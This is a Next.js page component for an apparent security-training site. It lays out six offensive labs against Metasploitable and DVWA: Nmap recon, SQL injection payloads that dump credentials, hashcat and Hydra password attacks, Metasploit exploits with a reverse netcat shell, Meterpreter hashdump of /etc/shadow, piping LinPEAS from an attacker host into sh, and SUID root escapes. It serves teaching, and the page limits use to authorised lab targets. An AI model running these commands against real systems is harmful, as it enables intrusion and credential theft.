'use client'
import React from 'react'
import Link from 'next/link'

const H2 = ({ num, children }: { num: string; children: React.ReactNode }) => (
  <h2 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1rem', fontWeight: 600, color: '#bf5fff', marginTop: '3rem', marginBottom: '1rem', display: 'flex', alignItems: 'center', gap: '10px' }}>
    <span style={{ background: 'rgba(191,95,255,0.1)', border: '1px solid rgba(191,95,255,0.3)', padding: '2px 8px', borderRadius: '3px', fontSize: '0.65rem', letterSpacing: '0.15em' }}>LAB-{num}</span>
    {children}
  </h2>
)
const H3 = ({ children }: { children: React.ReactNode }) => (
  <h3 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.82rem', fontWeight: 600, color: '#9933cc', marginTop: '1.75rem', marginBottom: '0.6rem' }}>▸ {children}</h3>
)
const Pre = ({ label, children }: { label?: string; children: string }) => (
  <div style={{ margin: '1rem 0 1.5rem' }}>
    {label && <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.15em', marginBottom: '4px' }}>{label}</div>}
    <pre style={{ background: '#050805', border: '1px solid #1a002e', borderRadius: '4px', padding: '1.25rem', overflow: 'auto', color: '#bf5fff', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.78rem', lineHeight: 1.7, whiteSpace: 'pre' as const }}>{children}</pre>
  </div>
)
const Alert = ({ type, children }: { type: 'objective' | 'warn' | 'tip'; children: React.ReactNode }) => {
  const c: Record<string, [string, string, string]> = {
    objective: ['#bf5fff', 'rgba(191,95,255,0.05)', 'OBJECTIVE'],
    warn:      ['#ff4136', 'rgba(255,65,54,0.05)',  'IMPORTANT'],
    tip:       ['#00ff41', 'rgba(0,255,65,0.04)',   'PRO TIP'],
  }
  const [color, bg, label] = c[type]
  return (
    <div style={{ background: bg, borderLeft: `3px solid ${color}`, padding: '1rem 1.25rem', borderRadius: '0 4px 4px 0', margin: '1.25rem 0', border: `1px solid ${color}33`, borderLeftColor: color }}>
      <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color, letterSpacing: '0.2em', marginBottom: '6px' }}>{label}</div>
      <div style={{ color: '#8a9a8a', fontSize: '0.85rem', lineHeight: 1.7 }}>{children}</div>
    </div>
  )
}

export default function OffensiveLab() {
  return (
    <div>
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a7a5a' }}>
        <Link href="/" style={{ color: '#5a7a5a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>›</span>
        <Link href="/modules/offensive" style={{ color: '#5a7a5a', textDecoration: 'none' }}>MOD-04 // OFFENSIVE</Link>
        <span>›</span>
        <span style={{ color: '#bf5fff' }}>LAB</span>
      </div>

      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>MODULE 04 · LAB ENVIRONMENT</div>
        <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.8rem', fontWeight: 700, color: '#bf5fff', margin: '0.5rem 0', textShadow: '0 0 20px rgba(191,95,255,0.3)' }}>OFFENSIVE SECURITY LAB</h1>
        <p style={{ color: '#5a7a5a', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', lineHeight: 1.6 }}>6 labs: nmap recon · web exploitation · SQLi · password cracking · Metasploit · privilege escalation</p>
      </div>

      <Alert type="warn">All labs run against intentionally vulnerable machines only. Never test against systems you do not own or have explicit written permission to test. Recommended: TryHackMe, HackTheBox, DVWA, Metasploitable, or local VMs.</Alert>

      <div style={{ background: '#0a0010', border: '1px solid #1a002e', borderRadius: '6px', padding: '1.25rem', marginBottom: '2rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#5a7a5a', letterSpacing: '0.2em', marginBottom: '0.75rem' }}>LAB ENVIRONMENT OPTIONS</div>
        {[
          'TryHackMe (tryhackme.com) — beginner-friendly, guided rooms, VPN access to target machines',
          'HackTheBox (hackthebox.com) — professional-grade, real CVEs, OSCP-style challenges',
          'DVWA — Damn Vulnerable Web App, run locally with Docker',
          'Metasploitable 2/3 — intentionally vulnerable VMs, run in VirtualBox or VMware',
          'VulnHub (vulnhub.com) — free vulnerable VMs to download and run locally',
        ].map((item, i) => (
          <div key={i} style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#5a7a5a', padding: '4px 0', display: 'flex', gap: '8px' }}>
            <span style={{ color: '#2a0050' }}>›</span><span>{item}</span>
          </div>
        ))}
      </div>

      <H2 num="01">Nmap Recon — Build a Full Target Picture</H2>
      <Alert type="objective">Run a comprehensive Nmap scan against a practice target. Identify all open ports, services, versions, and OS. Use NSE scripts to extract additional intelligence.</Alert>

      <Pre label="// SETUP: deploy Metasploitable2">{`# Download from: https://sourceforge.net/projects/metasploitable/
# Import OVA into VirtualBox → start VM → note IP with ifconfig
# Default creds: msfadmin:msfadmin
TARGET="10.10.10.100"   # replace with your Metasploitable IP`}</Pre>

      <Pre label="// PHASE 1: HOST DISCOVERY + FULL PORT SCAN">{`# Confirm target is up:
nmap -sn $TARGET

# Full port scan (all 65535):
nmap -p- -T4 $TARGET -oN all_ports.txt

# Extract open ports into a variable:
PORTS=$(grep "open" all_ports.txt | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
echo "Open ports: $PORTS"`}</Pre>

      <Pre label="// PHASE 2: DETAILED SERVICE SCAN">{`# Service versions + default scripts on open ports only:
nmap -p $PORTS -sV -sC -O $TARGET -oN detailed.txt
cat detailed.txt

# For each service found, note:
# - Exact version number
# - Search: servicename version CVE
# - Check exploitdb: searchsploit servicename version`}</Pre>

      <Pre label="// PHASE 3: TARGETED NSE SCRIPTS">{`# SMB vulnerabilities (critical to check):
nmap --script smb-vuln-ms17-010,smb-vuln-ms08-067 -p 445 $TARGET

# FTP anonymous access:
nmap --script ftp-anon -p 21 $TARGET

# HTTP enumeration:
nmap --script http-enum,http-methods -p 80 $TARGET

# MySQL empty password:
nmap --script mysql-empty-password -p 3306 $TARGET`}</Pre>

      <H2 num="02">Web App Enumeration with DVWA</H2>
      <Alert type="objective">Set up DVWA. Run directory enumeration. Intercept requests with Burp Suite. Identify and manually test for common vulnerabilities.</Alert>

      <Pre label="// DVWA SETUP">{`docker pull vulnerables/web-dvwa
docker run -d -p 80:80 vulnerables/web-dvwa
# Access: http://127.0.0.1
# Login: admin / password
# Click "Create/Reset Database"
# Set Security Level: LOW`}</Pre>

      <Pre label="// DIRECTORY ENUMERATION">{`# Install gobuster and SecLists:
sudo apt install gobuster seclists

# Run directory scan:
gobuster dir \
  -u http://127.0.0.1 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,html,txt,bak \
  -t 50 \
  -o gobuster_results.txt

cat gobuster_results.txt | grep "Status: 200"`}</Pre>

      <Pre label="// BURP SUITE WORKFLOW">{`# 1. Open Burp Suite Community Edition
# 2. Proxy tab: ensure port 8080 is the listener
# 3. Firefox: Settings > Network > Manual Proxy > 127.0.0.1:8080
# 4. Browse DVWA — all traffic captured in HTTP History

# KEY TESTS IN REPEATER:
# Change parameter values:
#   GET /dvwa/vulnerabilities/sqli/?id=1   →   id=99 (no result)
#   GET /dvwa/vulnerabilities/sqli/?id=1   →   id=' (SQL error)

# Test IDOR:
# If you see ?id=5 in a URL → try ?id=1, ?id=2
# Different user data returned = IDOR vulnerability`}</Pre>

      <H2 num="03">SQL Injection — Manual then Automated</H2>
      <Alert type="objective">Exploit DVWA SQL injection manually step by step. Extract the database and dump all credentials. Repeat with SQLMap to understand what automation does.</Alert>

      <Pre label="// MANUAL SQLi — step by step in DVWA">{`# URL: http://127.0.0.1/dvwa/vulnerabilities/sqli/
# Input field: User ID

# Step 1: Confirm injection
Input: '
# Error confirms injectable

# Step 2: Column count
Input: 1' ORDER BY 2--+    # works — 2 columns exist
Input: 1' ORDER BY 3--+    # error — only 2 columns

# Step 3: Extract DB name
Input: 1' UNION SELECT 1,database()--+

# Step 4: List tables
Input: 1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--+

# Step 5: Dump credentials
Input: 1' UNION SELECT user,password FROM users--+

# Hashes returned — crack them with hashcat next lab`}</Pre>

      <Pre label="// SQLMAP — same attack automated">{`# Save request from Burp (right-click → Save item) → dvwa.txt

sqlmap -r dvwa.txt --dbs
sqlmap -r dvwa.txt -D dvwa --tables
sqlmap -r dvwa.txt -D dvwa -T users --dump

# Compare SQLMap output to your manual results
# They should be identical — now you understand what the tool does internally`}</Pre>

      <H2 num="04">Password Attacks</H2>
      <Alert type="objective">Crack the MD5 hashes from DVWA with hashcat. Brute-force SSH on Metasploitable with Hydra. Understand rate limits and lockout policies.</Alert>

      <Pre label="// OFFLINE CRACKING with hashcat">{`# Create hash file:
cat > dvwa_hashes.txt << 'EOF'
5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
8d3533d75ae2c3966d7e0d4fcc69216b
EOF

# Identify: MD5 = mode 0
hashcat -m 0 dvwa_hashes.txt /usr/share/wordlists/rockyou.txt

# Show results:
hashcat -m 0 dvwa_hashes.txt --show

# With rules (harder passwords):
hashcat -m 0 dvwa_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule`}</Pre>

      <Pre label="// ONLINE BRUTE FORCE with Hydra">{`# SSH on Metasploitable:
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  ssh://10.10.10.100 -t 4 -V -o hydra_results.txt

# Expected result: msfadmin:msfadmin

# HTTP POST login (DVWA):
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  127.0.0.1 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"`}</Pre>

      <H2 num="05">Metasploit — Full Exploitation Chain</H2>
      <Alert type="objective">Exploit vsftpd 2.3.4 on Metasploitable. Get a Meterpreter shell. Run post-exploitation modules. Pivot to demonstrate full network impact.</Alert>

      <Pre label="// vsftpd 2.3.4 BACKDOOR — CVE-2011-2523">{`msfconsole

msf6> use exploit/unix/ftp/vsftpd_234_backdoor
msf6> set RHOSTS 10.10.10.100
msf6> run

# Root shell obtained
id       # uid=0(root)
hostname # metasploitable`}</Pre>

      <Pre label="// UPGRADE TO METERPRETER">{`# Background the shell: Ctrl+Z
msf6> use post/multi/manage/shell_to_meterpreter
msf6> set SESSION 1
msf6> run

meterpreter> sysinfo
meterpreter> hashdump
meterpreter> download /etc/shadow /tmp/shadow.txt
meterpreter> run post/multi/recon/local_exploit_suggester`}</Pre>

      <Pre label="// BONUS: Samba exploit — CVE-2007-2447">{`msf6> use exploit/multi/samba/usermap_script
msf6> set RHOSTS 10.10.10.100
msf6> set PAYLOAD cmd/unix/reverse_netcat
msf6> set LHOST YOUR_IP
msf6> run`}</Pre>

      <H2 num="06">Privilege Escalation + Write Your First Finding</H2>
      <Alert type="objective">Start from a low-privilege shell on Metasploitable. Identify privesc vectors with LinPEAS. Exploit SUID binary. Write a professional finding report entry.</Alert>

      <Pre label="// SETUP: low-priv shell">{`ssh user@10.10.10.100   # password: user
id     # uid=1001(user) — not root
whoami # user`}</Pre>

      <Pre label="// RUN LINPEAS">{`# From your machine, serve LinPEAS:
python3 -m http.server 8888

# On target:
curl http://YOUR_IP:8888/linpeas.sh | sh 2>/dev/null | tee /tmp/lp.txt

# Review output for:
# [!] SUID files
# [!] sudo -l results
# [!] Cron jobs with writable scripts
# [!] Readable sensitive files`}</Pre>

      <Pre label="// SUID EXPLOITATION">{`# Find SUID binaries:
find / -perm -u=s -type f 2>/dev/null

# nmap interactive mode (old versions):
nmap --interactive
nmap> !sh   # root shell

# vim SUID:
vim -c ':!/bin/bash'

# For any binary found, check:
# https://gtfobins.github.io`}</Pre>

      <Pre label="// WRITE YOUR FINDING">{`FINDING #001
══════════════════════════════════════════════════
Title:    Remote Code Execution via vsftpd 2.3.4 Backdoor
Severity: CRITICAL
CVSS:     10.0
CVE:      CVE-2011-2523
Asset:    10.10.10.100 Port 21

DESCRIPTION:
vsftpd 2.3.4 contains a backdoor that spawns a root shell on
port 6200 when triggered by a username containing ':)'.

EVIDENCE:
[Screenshot: msfconsole showing root shell obtained]
[Screenshot: id command output uid=0(root)]

REPRODUCTION:
1. use exploit/unix/ftp/vsftpd_234_backdoor
2. set RHOSTS 10.10.10.100
3. run → root shell on port 6200

IMPACT:
Complete system compromise. All data accessible.
Attacker can pivot to internal network.

RECOMMENDATION:
Upgrade vsftpd immediately to 3.0.5+.
Restrict FTP access to authorised IPs via firewall.
══════════════════════════════════════════════════`}</Pre>

      <div style={{ marginTop: '3rem', background: '#0a0010', border: '1px solid rgba(191,95,255,0.2)', borderRadius: '6px', padding: '1.5rem' }}>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '9px', color: '#9933cc', letterSpacing: '0.2em', marginBottom: '1rem' }}>RECOMMENDED PRACTICE PLATFORMS</div>
        {[
          ['TryHackMe', 'tryhackme.com', 'Start here — guided, beginner-friendly'],
          ['HackTheBox', 'hackthebox.com', 'Real CVEs, OSCP prep, professional level'],
          ['PortSwigger Web Academy', 'portswigger.net/web-security', 'Best free web security training, 200+ labs'],
          ['PentesterLab', 'pentesterlab.com', 'Web app exploitation focus'],
          ['Damn Vulnerable DeFi', 'damnvulnerabledefi.xyz', 'Smart contract challenges'],
          ['OSCP', 'offensive-security.com/pwk-oscp', 'Industry gold standard certification'],
        ].map(([name, url, desc], i) => (
          <div key={i} style={{ padding: '8px 0', borderBottom: '1px solid #0a0010', display: 'flex', gap: '12px' }}>
            <div style={{ flexShrink: 0, width: '160px' }}>
              <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.72rem', color: '#bf5fff', fontWeight: 600 }}>{name}</div>
              <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.6rem', color: '#3a0060' }}>{url}</div>
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#5a7a5a', lineHeight: 1.5 }}>{desc}</div>
          </div>
        ))}
      </div>

      <div style={{ marginTop: '3rem', paddingTop: '2rem', borderTop: '1px solid #1a002e', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
        <Link href="/modules/offensive" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#5a7a5a' }}>← BACK TO CONCEPT</Link>
        <Link href="/" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#bf5fff', padding: '8px 20px', border: '1px solid rgba(191,95,255,0.4)', borderRadius: '4px', background: 'rgba(191,95,255,0.06)' }}>
          ALL MODULES COMPLETE → DASHBOARD
        </Link>
      </div>
    </div>
  )
}
